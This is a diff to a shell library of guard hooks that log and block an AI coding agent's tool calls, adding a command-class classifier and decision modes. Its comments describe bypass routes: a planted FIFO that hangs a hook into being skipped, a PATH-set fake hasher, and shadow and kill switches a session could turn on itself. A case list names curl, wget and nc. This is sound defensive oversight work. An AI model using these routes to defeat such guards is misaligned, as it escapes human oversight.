@@ -580,108 +327,63 @@ floor_expand_home() {
   esac
 }
 
-# ─────────────────────────────────────────────────────────────────────────────
-# OBSERVE-1 (harbor#41) — the guard-decision record.
-#
-#   floor_log_decision <guard> <verdict> <rule.shape>
-#
-# Five properties, in strict precedence order. Every clause below is one of them.
-#
-# 1. A LOGGING FAILURE NEVER CHANGES A VERDICT. Four of the six hook scripts run
-#    `set -eu` (guard-bash:20, guard-egress:11, guard-selfedit:17,
-#    annotate-web:11) and admission-hook.sh:64-67 maps EVERY rc outside {0,2} to a
-#    DENY. So one unwrapped failing redirect turns a read-only disk into "every
-#    tool call in this session is blocked" — telemetry becoming an outage.
-#    Every statement here is neutralised and the last command is `return 0`.
-#
-# 2. THE DIRECTORY MUST BE UNWRITABLE. `>>` blocks forever in open(2) on a FIFO
-#    with no reader; admission-hook.sh:53 captures the guard's stdout in `$( )` and
-#    waits for EOF; `timeout`/`gtimeout` are BOTH ABSENT on macOS (verified on
-#    this box); and a PreToolUse hook that exceeds its timeout is SKIPPED. A hang
-#    here is therefore a total bypass of all 70 rules, reached with no latency at
-#    all. `[ -f ] && [ ! -L ]` bounds only a STATIC plant, not the race — the
-#    design pass measured a type-check-only writer hang 17 times in 1200 calls
-#    against a spinner that unlinks-and-mkfifos the sink. Planting a FIFO needs
-#    WRITE on the directory, so holding it at 0500 (admission-observe.sh) closes it:
-#    the attacker must fit chmod+unlink+mkfifo between our stat and our open.
-#    CAVEAT, deliberately recorded: access(2) short-circuits for uid 0, so this
-#    gate does NOT hold for a session running as root. The floor is not designed
-#    to be run as root and B1 is the backstop there.
-#    If the mode drifts we go BLIND, never slow — records drop, verdict untouched.
-#
-# 3. IT CREATES NOTHING. No mkdir, no `>`, no rotation, no size check. A hot path
-#    that creates files is a hot path that can be aimed; and `[ -d ] || mkdir -p`
-#    FORKS on every call once the dir is uncreatable, making the broken case an
-#    order of magnitude slower than the healthy one. It is also what makes
-#    floor-test.sh structurally unable to reach the operator's live tree: the
-#    suite sets CLAUDE_CONFIG_DIR but never $HOME, and a writer that cannot
-#    create cannot pollute what it cannot find. That is not hypothetical — a
-#    design-phase prototype whose writer COULD mkdir wrote 1002 records into the
-#    live ~/.claude/MEMORY tree during this ticket's own design.
-#
-# 4. NO PAYLOAD-DERIVED BYTES REACH THE BUILDER. Every field is a call-site
-#    literal, a closed enum mapped through a `case` with NO pass-through arm,
-#    fixed-width hex, or a clock reading. There is no escaping path because there
-#    is nothing escapable — POSIX sh has no JSON.stringify, and a redaction that
-#    depends on escaping is one edit away from being wrong. Note what is absent:
-#    the floor_block MESSAGE. admission-egress.sh:420 interpolates a redirect target
-#    lifted out of the command, and admission-self-edit.sh:73 interpolates the
-#    payload's resolved file_path (CONSTITUTION №3).
-#
-# 5. ONE RECORD = ONE printf = ONE write(). Two guards append to one file for a
-#    single Bash call (admission-install.sh:88-89) and tool calls run in parallel, so
-#    interleaving is the normal case, not the edge case. Measured on this box:
-#    concurrent `printf >> file` under /bin/sh is atomic up to EXACTLY 1024 bytes
-#    including the newline and tears reliably above it (8 writers x 300 records:
-#    0 torn at 1023, 1278 torn at 1024). That bound is stdio's buffer, NOT
-#    PIPE_BUF — PIPE_BUF governs pipes, not regular files, and quoting it here
-#    would be a plausible wrong reason for a right number. Records measure
-#    ~110 bytes; the cap is asserted at 512 to keep half the real margin spare.
-#
-# NOT SETTABLE FROM THE ENVIRONMENT, deliberately: an overridable sink path or a
-# HARBOR_ADMISSION_OBSERVE_DISABLE switch would be an undocumented SECOND kill switch for the
-# block ledger, settable from a project settings.json `env` block — the exact
-# class already refused for FLOOR_GREP, FLOOR_AWK and FLOOR_INSTR_SURFACES.
-#
-# EVERY GUARD THAT LOGS MUST BE NAMED HERE, and the enum is why: an unlisted token
-# is coerced to `other`, silently. guard-cloud and guard-destroy shipped
-# (harbor#201/#194) without this line being extended, so 745 of their decisions
-# filed as g=other — invisible to the tool census, whose whole purpose is to catch
-# a dead dispatch arm by a class that never appears. A guard added to the floor
-# without a token added here is a guard the ledger cannot see.
-#
-# IT THEN HAPPENED AGAIN, TO THE GUARD THAT SHIPPED NEXT, and the second time is
-# what makes this a mechanism problem rather than an oversight. `deliverables` was
-# passed by admission-deliverables.sh from the day it landed and was never added here,
-# so its entire output filed as `other`. Measured on this box 2026-09-05: all
-# 1,805 `other` records are that one guard -- 1,780 deliverables-clean, 20
-# home-loose, 5 dropzone -- and NOT ONE was written by an unrecognised guard. The
-# bucket whose whole job is to make an unknown writer visible was 100% a known
-# one, so the census could not have caught the thing it exists to catch.
-#
-# So the paragraph above was true, was written down, and still did not hold,
-# because a rule with no mechanism is a wish. LINT C7 IS THE MECHANISM: it reads
-# this line against every literal `floor_log_decision <token>` call site in bin/
-# and hooks/ and fails when the two disagree in EITHER direction -- an unlisted
-# writer (this defect) and a listed token nobody writes (the dead dispatch arm the
-# census is for). Extending this line is now a change the linter demands, not one
-# the next author has to remember.
+# OBSERVE-1 (harbor#41) - the guard-decision record: floor_log_decision <guard> <verdict> <rule.shape>. Five properties, in strict precedence:
+# 1. A LOGGING FAILURE NEVER CHANGES A VERDICT. Hooks run `set -eu` and admission-hook.sh maps every rc outside {0,2} to a DENY, so every statement here is neutralised and the last command is `return 0`.
+# 2. THE SINK DIRECTORY MUST BE UNWRITABLE (0500, admission-observe.sh): `>>` onto a planted FIFO blocks forever, and a hook that times out is SKIPPED, so a hang is a total bypass. A type check alone does not close the race. Does not hold for uid 0 (B1 is the backstop). If the mode drifts we go blind, never slow.
+# 3. IT CREATES NOTHING (no mkdir, no `>`, no rotation): a hot path that creates files can be aimed, and `mkdir -p` forks on every call once the dir is uncreatable. It also keeps suites from polluting the live tree.
+# 4. NO PAYLOAD-DERIVED BYTES REACH THE BUILDER: every field is a call-site literal, a closed enum through a `case` with no pass-through arm, fixed-width hex, or a clock reading. The floor_block MESSAGE is absent on purpose (it interpolates payload text; CONSTITUTION №3).
+# 5. ONE RECORD = ONE printf = ONE write(): guards append concurrently, and `printf >>` under /bin/sh is atomic only up to 1024 bytes including the newline (stdio's buffer, not PIPE_BUF). Records are ~110 bytes; the cap is asserted at 512.
+# NOT SETTABLE FROM THE ENVIRONMENT: an overridable sink path or an OBSERVE_DISABLE switch would be a second kill switch (the class already refused for FLOOR_GREP, FLOOR_AWK, FLOOR_INSTR_SURFACES).
+# EVERY GUARD THAT LOGS MUST BE NAMED in FLOOR_OBS_GUARDS below: an unlisted token is coerced to `other`, silently. Lint C7 (audit.decision-token-listed) reads that line against every literal floor_log_decision call site and fails in either direction.
 FLOOR_OBS_GUARDS=' bash egress selfedit integrity web wrapper session cloud destroy deliverables prod inject govern apiroute '
-# `ask` is a REAL verdict, not a near-miss. It was missing here for the same reason
-# the guard tokens were: the enum predates the two ASK-gate guards. 548 ask records
-# had already been coerced to `other` when this was found — and the ask tier is
-# exactly the one that auto-approves in an unattended session (admission-cloud.sh:104),
-# so "how often was the soft tier hit" was the one question the ledger most needed
-# to answer and structurally could not.
+# `ask` is a REAL verdict (the tier that auto-approves in an unattended session); it was once missing and its records were coerced to `other`.
 FLOOR_OBS_VERDICTS=' block allow deny ask gate advise override armed shadow covered '
 FLOOR_OBS_SHAPES=' argv flat path channel content meta '
 FLOOR_OBS_TOOLS=' Bash Write Edit MultiEdit NotebookEdit WebFetch WebSearch Task Agent ToolSearch mcp none other '
+# The escape classes (harbor#1441, #555 decision 10 (a)): what an unconfined Bash call was, as a closed enum. Every name is
+# a row of contracts/confinement-classes.tsv (the treatment); the observe-report suite holds the two equal.
+HARBOR_ADMISSION_CLASSES='readonly vcs cloud container script interp network fsmutate system compound event-bus session-title other'
+
+# floor_obs_class <command> — sets _xo to the class of a command by its first verb. Parameter expansion and
+# case only: no fork on the hot path, and no byte of the command can reach _xo (every arm assigns a literal).
+# `cd X &&` and `VAR=v` prefixes are stepped over; the first verb of a compound is its class, an approximation the
+# report says out loud.
+floor_obs_class() {
+  _xs="$1"
+  case "$_xs" in
+    *session-titles/*) _xo=session-title; return 0 ;;
+    *event-bus.sh*emit*|*'harbor event emit'*) _xo=event-bus; return 0 ;;
+  esac
+  _xn=0
+  while [ "$_xn" -lt 6 ]; do
+    _xn=$((_xn + 1))
+    _xs="${_xs#"${_xs%%[![:space:]]*}"}"
+    _xv="${_xs%%[[:space:];&|<>()]*}"
+    case "$_xv" in
+      cd|pushd) _xr="${_xs#*&&}"; [ "$_xr" != "$_xs" ] || _xr="${_xs#*;}"; [ "$_xr" != "$_xs" ] || break; _xs="$_xr"; continue ;;
+      [A-Za-z_]*=*) _xr="${_xs#*[[:space:]]}"; [ "$_xr" != "$_xs" ] || break; _xs="$_xr"; continue ;;
+    esac
+    break
+  done
+  _xv="${_xv##*/}"
+  case "$_xv" in
+    for|while|until|if|case|'{'|'!'|function|'') _xo=compound ;;
+    cd|pushd|grep|egrep|fgrep|rg|sed|awk|cat|head|tail|ls|find|wc|sort|uniq|jq|diff|cmp|stat|file|echo|printf|test|'['|pwd|tr|cut|basename|dirname|realpath|readlink|fd|tree|du|df|which|type|command|date|env|true|false|column|less|more|nl|xargs|wait|sleep) _xo=readonly ;;
+    git|gh) _xo=vcs ;;
+    gcx|gcloud|bq|cu|stape|gsutil|aws|az|fly|kubectl|terraform|firebase|wrangler) _xo=cloud ;;
+    docker|docker-compose|colima|podman) _xo=container ;;
+    sh|bash|zsh|dash) _xo=script ;;
+    python|python3|uv|uvx|node|bun|npm|npx|pnpm|ruby|perl|deno|pip|pip3|pytest) _xo=interp ;;
+    curl|wget|ssh|scp|rsync|nc|ping|dig|nslookup) _xo=network ;;
+    # mktem[p]: a bracket, so the bare-mktemp tripwire (harbor#1298) does not read this label as a call (harbor#1441).
+    mkdir|cp|mv|rm|touch|chmod|chown|ln|install|mktem[p]|rmdir|ditto|tee) _xo=fsmutate ;;
+    open|osascript|launchctl|brew|sudo|defaults|pkill|kill|killall|ps|lsof|pbcopy|pbpaste|caffeinate|say|security|codesign|xcrun) _xo=system ;;
+    *) case "${_xs%%[[:space:]]*}" in ./*|/*) _xo=script ;; *) _xo=other ;; esac ;;
+  esac
+}
 
 floor_log_decision() { # <guard> <verdict> <rule.shape>
-  # Charset gate BEFORE enum membership, always. The membership test expands the
-  # candidate inside double quotes so its metacharacters are already literal,
-  # but the gate keeps that true independently of one pair of quotes surviving a
-  # future edit.
+  # Charset gate BEFORE enum membership, so the membership test stays literal even if its quoting is edited.
   _og="${1:-}"
   case "$_og" in ''|*[!abcdefghijklmnopqrstuvwxyz0-9-]*) _og=other ;; esac
   case "$FLOOR_OBS_GUARDS" in *" $_og "*) ;; *) _og=other ;; esac
@@ -692,10 +394,7 @@ floor_log_decision() { # <guard> <verdict> <rule.shape>
   # A call that shadow-recorded (or covered, harbor#1300) a would-be block is not also a clean pass (harbor#482).
   case "$_ov:${FLOOR_SHADOWED:-}" in allow:1) return 0 ;; esac
 
-  # <rule>.<shape> split by parameter expansion — two builtins, no forks. The
-  # DOTTED form (not a `flat-`/`argv-` prefix) keeps the rule token shared across
-  # a flat/argv twin, so "top rules" groups them as one rule while the DE-01 axis
-  # stays queryable on `s`.
+  # <rule>.<shape> split by parameter expansion (no forks). The dotted form keeps a flat/argv twin under one rule token for "top rules".
   _ors="${3:-}"
   _or="${_ors%.*}"; _osh="${_ors##*.}"
   case "$_or" in ''|*[!abcdefghijklmnopqrstuvwxyz0-9-]*) _or=unclassified ;; esac
@@ -703,8 +402,7 @@ floor_log_decision() { # <guard> <verdict> <rule.shape>
   case "$_osh" in ''|*[!abcdefghijklmnopqrstuvwxyz]*) _osh=meta ;; esac
   case "$FLOOR_OBS_SHAPES" in *" $_osh "*) ;; *) _osh=meta ;; esac
 
-  # tool_name is ATTACKER-SHAPED for the mcp__* family (a repo-supplied .mcp.json
-  # names them), so it is MAPPED to a constant, never passed through.
+  # tool_name is attacker-shaped for mcp__* (a repo-supplied .mcp.json names them), so it is MAPPED to a constant.
   _ot="${FLOOR_TOOL:-}"
   case "$_ot" in '') _ot=none ;; *[!A-Za-z0-9_]*) _ot=other ;; esac
   case "$FLOOR_OBS_TOOLS" in
@@ -712,48 +410,15 @@ floor_log_decision() { # <guard> <verdict> <rule.shape>
     *) case "$_ot" in mcp__*) _ot=mcp ;; *) _ot=other ;; esac ;;
   esac
 
-  # THE SINK FOLLOWS THE WRITER, NOT THE CALLER. This read
-  # `${CLAUDE_CONFIG_DIR:-$HOME/.claude}` — the CALLER's environment — and that is
-  # how a guard executed out of a repo checkout filed its fixtures next to the
-  # operator's real decisions. Measured 2026-08-25 on this box: 1,723 cloud/destroy
-  # records in one day written by suite copies, and every crit-eligible
-  # `wrapper-no-jq` record traced to ONE line in an unmerged branch's
-  # destroy-guard-test.sh, which fires `env -i PATH=... HOME="$HOME"`.
-  #
-  # THAT `env -i` IS WHY PER-SUITE ISOLATION CANNOT BE THE FIX. It strips
-  # CLAUDE_CONFIG_DIR by construction and re-passes HOME deliberately, so the
-  # sink resolved to the live tree no matter what the suite set. A convention
-  # cannot survive a caller whose whole purpose is a clean environment — and the
-  # same fix by convention was already tried and lost: lint F4 hand-lists four
-  # suites, and the two that escaped were not among them.
-  #
-  # `$0` IS THE GUARD, NOT THIS FILE. library-admission.sh is SOURCED (`. "$DIR/library-admission.sh"`
-  # in every guard), and POSIX sh does not rebind $0 inside a function, so $0 is the
-  # sourcing script: <cfg>/bin/<guard>.sh for all 22 wired hook commands, every one
-  # of them an absolute path (verified against the live hook table). Two strips give
-  # the config root — byte-identical to the old answer in production, and a checkout
-  # with no MEMORY/OBSERVABILITY tree everywhere else. The writer CREATES NOTHING
-  # (property 3), so "everywhere else" means blind rather than misfiled.
-  #
-  # floor_config_dir() IS DELIBERATELY UNTOUCHED, and the distinction is the whole
-  # design: a guard must keep resolving surface rules against the config dir the
-  # SESSION uses — it protects the directory it is governing, not the directory it
-  # was copied from. Only the sink follows the writer.
-  #
-  # The trailing-slash strip is kept from the previous spelling: without it CFG_RE
-  # gained a `//+` and every surface rule silently stopped firing (red-team pass 8).
-  # A relative spelling is still refused outright — `sh admission-bash.sh` from inside
-  # bin/ leaves no slash to strip, so the case below drops the record. Blind, never
-  # wrong.
+  # THE SINK FOLLOWS THE WRITER, NOT THE CALLER. Reading CLAUDE_CONFIG_DIR or $HOME let a guard run from a checkout, or under a suite's `env -i ... HOME=`, file fixtures next to the operator's real decisions; per-suite isolation cannot fix that.
+  # `$0` is the sourcing guard (<cfg>/bin/<guard>.sh, absolute for every wired hook command; POSIX sh does not rebind $0 in a function), so two strips give the config root. The writer creates nothing (property 3): elsewhere it is blind, not misfiled.
+  # floor_config_dir() is deliberately untouched: surface rules resolve against the SESSION's config dir. Only the sink follows the writer.
+  # Trailing slashes are stripped (red-team pass 8); a relative $0 is refused by the case below, which drops the record.
   _ocfg="${0%/*}"; _ocfg="${_ocfg%/*}"
   while [ "${_ocfg%/}" != "$_ocfg" ] && [ "$_ocfg" != "/" ]; do _ocfg="${_ocfg%/}"; done
   case "$_ocfg" in /*) ;; *) return 0 ;; esac
 
-  # Host token via the `read` BUILTIN — zero forks, for a value that changes once
-  # per boot. TYPE-CHECKED FIRST: `read` from a FIFO blocks exactly like `>>`
-  # does, so the token file gets the same treatment as the sink. Absent or
-  # hostile => a partition that does not exist => the gate below refuses =>
-  # blind, never wrong.
+  # Host token via the `read` BUILTIN (zero forks), type-checked first: `read` from a FIFO blocks like `>>`. Absent or hostile gives a partition that does not exist, so the gate below refuses: blind, never wrong.
   _oh=unknown-host
   _oht="$_ocfg/.helm-obs-host"
   if [ -f "$_oht" ] && [ ! -L "$_oht" ]; then
@@ -762,46 +427,20 @@ floor_log_decision() { # <guard> <verdict> <rule.shape>
     case "$_ohr" in ''|*[!A-Za-z0-9_-]*) ;; *) _oh="$_ohr" ;; esac
   fi
 
-  # THE TWO GATES. Order matters: the directory gate is what keeps the file
-  # gate's answer true one instruction later. See property 2 above.
+  # THE TWO GATES. Order matters: the directory gate keeps the file gate's answer true one instruction later (property 2).
   _odir="$_ocfg/MEMORY/OBSERVABILITY/$_oh"
   [ ! -w "$_odir" ] || return 0
   _osink="$_odir/guard-decisions.jsonl"
   { [ -f "$_osink" ] && [ ! -L "$_osink" ]; } || return 0
 
-  # The clock's fork (the session key below adds one hash, ~2 ms; harbor#309). There is no POSIX builtin clock: EPOCHSECONDS and
-  # EPOCHREALTIME are unset under /bin/sh (bash 3.2.57), $SECONDS reads 0 in a
-  # fresh hook process, and /usr/bin/awk has no systime(). A malformed clock
-  # ABORTS the record rather than writing an unparseable field — one dropped
-  # record beats a ledger that jq refuses.
+  # The clock's fork (the session key below adds one hash, ~2 ms; harbor#309). No POSIX builtin clock exists (EPOCHSECONDS is unset under /bin/sh, $SECONDS reads 0, awk has no systime). A malformed clock aborts the record: one dropped record beats a ledger jq refuses.
   _ots="$(date -u '+%Y-%m-%dT%H:%M:%SZ' 2>/dev/null)" || _ots=""
   case "$_ots" in
     [0-9][0-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9]T[0-9][0-9]:[0-9][0-9]:[0-9][0-9]Z) ;;
     *) return 0 ;;
   esac
 
-  # DECISION PATHS ONLY — block, deny, ask. Never allow.
-  #
-  # The original rule was `block` alone, and its reasoning still holds for the
-  # allow path verbatim: on an allow there is no consumer, the rules are
-  # deterministic on the command so a command that allows once allows always, and
-  # it would put a fork plus a command oracle on the overwhelming majority of the
-  # file. That majority is real — allow is 12,863 of 21,303 records measured.
-  #
-  # BUT `block` ALONE MADE THE FIELD UNREACHABLE FOR TWO WHOLE GUARDS.
-  # guard-cloud and guard-destroy never emit `block` — their entire output is
-  # permissionDecision verdicts — so `h` was "-" on 7,873 of 7,873 of their
-  # records, and "which command triggered this deny" was unanswerable for the
-  # tier that gates dataset deletion and device wipes (harbor#350).
-  #
-  # The cost objection does not transfer to this tier, and that is measured
-  # rather than assumed: deny+ask is 8,450 records, of which 8,429 are
-  # cloud+destroy and ~97% of those are burst-shaped test fixtures that
-  # harbor#343 stops at the source. Excluding them, deny+ask across the whole
-  # ledger's life is 21 records. A fork on that is not a fork on the hot path.
-  #
-  # `advise` and `armed` are deliberately NOT here: neither gates anything, so
-  # neither has the consumer that justifies the fork.
+  # DECISION PATHS ONLY (block, deny, ask), never allow: an allow has no consumer and the digest costs a fork on the majority of records. `block` alone left guard-cloud and guard-destroy records without `h` (they emit only permissionDecision verdicts; harbor#350). `advise` and `armed` gate nothing, so they get no digest.
   _odg=-
   case "$_ov" in block|deny|ask|shadow|covered)
     { _odg="$(floor_obs_digest "$_ocfg")"; } 2>/dev/null || _odg=-
@@ -811,12 +450,8 @@ floor_log_decision() { # <guard> <verdict> <rule.shape>
     esac ;;
   esac
 
-  # THE SESSION KEY, `sk` (harbor#309): which session wrote the record, so a block can be joined to
-  # what that session did next. Salted like `h` under a `sid:` prefix, never the raw id. Read by
-  # expansion, not jq: no fork for the read, one hash (on allow records too, which carry no `h`).
-  # ANCHORED to the payload's first key, as the harness sends it (fixtures/pretooluse-bash-real.json):
-  # a reordered payload gives `-` rather than an MCP tool's `session_id` argument, and nothing past
-  # the prefix is scanned. Any doubt gives `-`; the verdict never depends on it.
+  # THE SESSION KEY, `sk` (harbor#309): which session wrote the record, so a block can be joined to what that session did next. Salted like `h` under a `sid:` prefix, never the raw id; read by expansion, not jq.
+  # ANCHORED to the payload's first key as the harness sends it (fixtures/pretooluse-bash-real.json); any doubt gives `-`, and the verdict never depends on it.
   _osid=""
   case "${FLOOR_IN:-}" in '{"session_id":"'*)
     _osid=${FLOOR_IN#'{"session_id":"'}; _osid=${_osid%%'"'*} ;;
@@ -832,10 +467,7 @@ floor_log_decision() { # <guard> <verdict> <rule.shape>
     esac
   fi
 
-  # THE CONFINEMENT FIELD, `c` (harbor#1298, #555): a closed enum, never a payload byte. `off` while no confinement is
-  # installed (no marker beside managed settings: deploy-confinement.sh writes it), `unconfined` when the call asked for
-  # the unsandboxed retry, `confined` otherwise, `-` for a tool the confinement does not wrap. `-f` and a case match
-  # only: no fork on the hot path. Read by admission-observe-report.sh --confinement for #555 decision 10 (a), the escape rate.
+  # THE CONFINEMENT FIELD, `c` (harbor#1298, #555): a closed enum. `off` while no confinement is installed (deploy-confinement.sh writes the marker), `unconfined` when the call asked for the unsandboxed retry, `confined` otherwise, `-` for a non-Bash tool. Read by admission-observe-report.sh --confinement.
   _oc=-
   if [ "$_ot" = Bash ]; then
     _oc=off
@@ -847,38 +479,22 @@ floor_log_decision() { # <guard> <verdict> <rule.shape>
     fi
   fi
 
-  { printf '{"v":1,"ts":"%s","g":"%s","d":"%s","r":"%s","s":"%s","t":"%s","h":"%s","sk":"%s","c":"%s"}\n' \
-      "$_ots" "$_og" "$_ov" "$_or" "$_osh" "$_ot" "$_odg" "$_osk" "$_oc" >> "$_osink"; } 2>/dev/null || :
+  # THE ESCAPE CLASS, `x` (harbor#1441): the class of an unconfined call from its first verb, printed as a literal from HARBOR_ADMISSION_CLASSES. Only the bash guard's unconfined records carry one; read by admission-observe-report.sh --confinement.
+  _ox=-
+  if [ "$_oc" = unconfined ] && [ "$_og" = bash ]; then
+    _xo=other; floor_obs_class "${FLOOR_OBS_SUBJECT:-}" 2>/dev/null || :; _ox="$_xo"
+    case " $HARBOR_ADMISSION_CLASSES " in *" $_ox "*) ;; *) _ox=other ;; esac
+  fi
+
+  { printf '{"v":1,"ts":"%s","g":"%s","d":"%s","r":"%s","s":"%s","t":"%s","h":"%s","sk":"%s","c":"%s","x":"%s"}\n' \
+      "$_ots" "$_og" "$_ov" "$_or" "$_osh" "$_ot" "$_odg" "$_osk" "$_oc" "$_ox" >> "$_osink"; } 2>/dev/null || :
   return 0
 }
 
-# floor_obs_digest <cfg-dir> — 16 hex of sha256(salt ":" subject[0:512]), or "-".
-#
-# THE SUBJECT IS $FLOOR_OBS_SUBJECT, set by each guard right after it extracts
-# its payload — NOT a fourth argument to floor_block. Passing payload text into
-# floor_block would leave it one careless edit away from the stderr printf. Not
-# $FLOOR_IN either: the raw payload carries session_id and cwd, so the same
-# command would hash differently in two sessions and recurrence counting — the
-# only thing the digest is for — would be dead on arrival.
-#
-# SALTED, not merely truncated. An unsalted truncated sha256 of a low-entropy
-# shell command is a CONFIRMATION ORACLE, not a redaction: floor_block's stderr
-# TELLS the operator which commands were blocked, so known plaintext is
-# guaranteed, and at 48 bits a match against a candidate is effectively proof.
-# Shortening it to blunt that destroys the recurrence counting it exists for.
-# There is no truncation length that is both safe and useful; a per-install
-# secret is the only operating point that answers "is this the same command
-# again?" without answering "what was the command?".
-#
-# THE HASHER IS PINNED TO ABSOLUTE PATHS, exactly as FLOOR_GREP is pinned above
-# and for the identical reason. floor_sha (below) resolves sha256sum/shasum by
-# BARE NAME through PATH; that is harmless because it runs only at SessionStart,
-# but a bare-name resolution on the block path is a per-tool-call CODE EXECUTION
-# primitive for anyone who can set PATH via a project settings.json `env` block —
-# and their fake sha256sum would receive, as its stdin, the very command text
-# this design promised never to write down. floor_sha is therefore NOT reused.
-# /usr/bin/shasum is LAST because it is a Perl script and an order of magnitude
-# slower than sha256sum — a cliff entered silently on a box lacking the first.
+# floor_obs_digest <cfg-dir> [subject] - 16 hex of sha256(salt ":" subject[0:512]), or "-".
+# The subject is $FLOOR_OBS_SUBJECT, set by each guard after it extracts its payload; NOT an argument to floor_block (payload text beside the stderr printf is one edit from a leak) and NOT $FLOOR_IN (session_id and cwd would make one command hash differently per session and kill recurrence counting).
+# SALTED, not just truncated: an unsalted short sha256 of a low-entropy command is a confirmation oracle, and floor_block's stderr hands over the plaintext. A per-install secret is the only operating point that answers "same command again?" without answering "what was it?".
+# The hasher is pinned to absolute paths like FLOOR_GREP: floor_sha resolves through PATH, and on the block path a PATH-set fake would receive the command text, so floor_sha is NOT reused. /usr/bin/shasum is last (Perl, an order of magnitude slower).
 floor_obs_digest() { # <cfg-dir> [subject]
   # harbor#309: an explicit subject (the session key's) replaces the guard's, one hasher for both.
   _dsub="${2-${FLOOR_OBS_SUBJECT:-}}"
@@ -919,27 +535,10 @@ floor_obs_digest() { # <cfg-dir> [subject]
   return 0
 }
 
-# floor_block <guard> <message> [rule.shape] — deny the tool call: reason to
-# stderr (fed back to the model), one record, exit 2. The one blocking exit in
-# the floor.
-# THE RECORD IS WRITTEN AFTER BOTH printfs, never before: a logger fault must not
-# be able to swallow the reason the operator needs in order to argue with the
-# rule. And the rule id is shown to the operator, because "this rule is wrong" is
-# the feedback this ticket exists to collect and they cannot name a rule the
-# floor never told them about.
-#
-# THE REMEDY PRINTED IS THE NARROWEST TRUE ONE (harbor#482). It used to be the
-# kill-switch for every rule, which turns all of them off to get past one. A `!`
-# command is not a tool call, so no guard sees it: one command, once, by the
-# operator. A file-tool refusal names the edit instead, made by the operator by
-# hand. Lint F16 keeps the blanket hatch out of every guard but the two where it
-# is the true remedy.
-#
-# SHADOW (harbor#482): under HARBOR_ADMISSION_SHADOW=1, set by the operator at launch
-# like the kill-switch, a rule records `shadow` and RETURNS instead of exiting,
-# so the guard keeps evaluating: every would-be block is recorded, and a later
-# rule that stays enforcing (floor_shadow_enforces) is still reached and still
-# blocks. Returning 0 keeps `hit … && floor_block …` lists alive under set -e.
+# floor_block <guard> <message> [rule.shape] - deny the tool call: reason to stderr (fed back to the model), one record, exit 2. The one blocking exit in the floor.
+# The record is written AFTER both printfs, so a logger fault cannot swallow the reason; the rule id is shown so the operator can name a wrong rule.
+# The printed remedy is the NARROWEST true one (harbor#482): a `!` command or a hand edit, not the blanket kill-switch. Lint F16 keeps the blanket hatch out of every guard but the two where it is the true remedy.
+# SHADOW (harbor#482): under HARBOR_ADMISSION_SHADOW=1 a rule records `shadow` and RETURNS, so the guard keeps evaluating and a later enforcing rule (floor_shadow_enforces) still blocks. Returning 0 keeps `hit ... && floor_block ...` lists alive under set -e.
 floor_block() {
   # COVERED (harbor#1300): the confinement denies this target, so the OS decides; recorded, and the guard keeps
   # evaluating exactly as under shadow, so a later rule that is not covered still blocks.
@@ -949,9 +548,28 @@ floor_block() {
     FLOOR_SHADOWED=1
     return 0
   fi
-  if [ "${HARBOR_ADMISSION_SHADOW:-${HELM_FLOOR_SHADOW:-0}}" = 1 ] && ! floor_shadow_enforces "$1" "${3%.*}"; then
+  # ROWS DECIDE (harbor#1030 PR 1): for a guard whose rules are registered, the mode of the fired rule is its controls.tsv row,
+  # read by bin/admission-decide.sh beside this file. The predicate stays in the guard; the stamp is printed by the decision function.
+  # No decision function beside the guard decides as before: the same table, with every row a block row.
+  _fbv=''; _fbd="${FLOOR_DECIDE:-}"
+  if [ -z "$_fbd" ]; then case "$0" in */*) _fbd="${0%/*}/admission-decide.sh" ;; *) _fbd=./admission-decide.sh ;; esac; fi
+  if [ "$1" = egress ] && [ -f "$_fbd" ]; then
+    _fbs=0; [ "${HARBOR_ADMISSION_SHADOW:-0}" = 1 ] && _fbs=1
+    _fbe=0; ! floor_shadow_enforces "$1" "${3%.*}" || _fbe=1
+    _fbv="$(sh "$_fbd" "$1" "${3%.*}" --shadow "$_fbs" --enforcing "$_fbe" | cut -f1)" || _fbv=block
+    case "$_fbv" in block|shadow|warn) ;; *) _fbv=block ;; esac
+  elif [ "${HARBOR_ADMISSION_SHADOW:-0}" = 1 ] && ! floor_shadow_enforces "$1" "${3%.*}"; then
+    _fbv=shadow
+  fi
+  if [ "$_fbv" = shadow ]; then
     printf 'HELM FLOOR [%s:%s]: SHADOW — would have blocked; recorded, not enforced\n' "$1" "${3%.*}" >&2
     floor_log_decision "$1" shadow "${3:-}" || :
+    FLOOR_SHADOWED=1
+    return 0
+  fi
+  if [ "$_fbv" = warn ]; then
+    printf 'HELM FLOOR [%s:%s]: WARN — %s\n' "$1" "${3%.*}" "$2" >&2
+    floor_log_decision "$1" advise "${3:-}" || :
     FLOOR_SHADOWED=1
     return 0
   fi
@@ -975,23 +593,9 @@ floor_block() {
 # inherited from the environment cannot suppress this call's allow record.
 FLOOR_SHADOWED=
 
-# floor_shadow_enforces <guard> <rule> — 0 iff this rule keeps blocking in a
-# shadow session. The set is what would let a shadow session make itself, or a
-# later session, unguarded or unrecorded, or take an act reserved to a person:
-#   selfedit         floor control surfaces and switch-bearing settings, file tools
-#   *surface*, *-cfg*, cd-bridge-*
-#                    the same surfaces and the config dir from a command: without
-#                    these a shadow session could rewrite settings.json or replace
-#                    the guards that are meant to keep enforcing (review of #970)
-#   killswitch-*     setting or persisting either switch, from a command
-#   startup-file-*   shell startup files, where a persisted switch would live
-#   api-route-*      Claude Code's own API route in settings.json
-#   finding-label-*  a finding disposition, which is the operator's act (#855)
-# The surface family is matched by the rule ids' own naming, not listed one by one;
-# floor.ledger-test SH-11 derives every guard-bash rule whose message names a floor
-# surface or the config dir and fails if one falls outside these patterns.
-# Everything else is measured, not enforced. guard-cloud and guard-destroy decide
-# through permissionDecision and do not read shadow at all (docs/explanation/admission-baseline.md).
+# floor_shadow_enforces <guard> <rule> - 0 iff this rule keeps blocking in a shadow session: the set that would let a shadow session unguard or unrecord itself or a later one, or take an act reserved to a person.
+#   selfedit; *surface*, *-cfg*, cd-bridge-* (surfaces and the config dir from a command); killswitch-*; startup-file-* (where a persisted switch would live); api-route-*; finding-label-* (a finding disposition is the operator's act, #855).
+# Matched by the rule ids' naming; floor.ledger-test SH-11 derives every guard-bash rule naming a floor surface or the config dir and fails if one falls outside. Everything else is measured, not enforced. guard-cloud and guard-destroy decide through permissionDecision and do not read shadow (admission-baseline.md).
 floor_shadow_enforces() { # <guard> <rule>
   case "$1" in selfedit) return 0 ;; esac
   case "$2" in
@@ -1001,17 +605,9 @@ floor_shadow_enforces() { # <guard> <rule>
   return 1
 }
 
-# floor_confinement_covers <guard> <rule> — 0 iff this block is skipped because the confinement already denies its
